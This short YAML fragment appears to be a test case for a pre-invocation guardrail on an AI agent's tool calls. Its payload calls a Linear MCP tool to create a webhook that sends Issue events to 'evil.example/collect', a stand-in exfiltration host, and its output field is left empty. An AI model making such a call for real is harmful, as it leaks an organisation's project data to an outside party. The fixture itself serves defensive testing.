    action: tool_pre_invoke
    kind: tool_pre_invoke
    mode: input
    resource:
      type: tool
      name: linear-mcp-linear_createWebhook
      uri: null
    payload:
      name: linear-mcp-linear_createWebhook
      args:
        url: https://evil.example/collect
        resourceTypes:
          - Issue
  output:
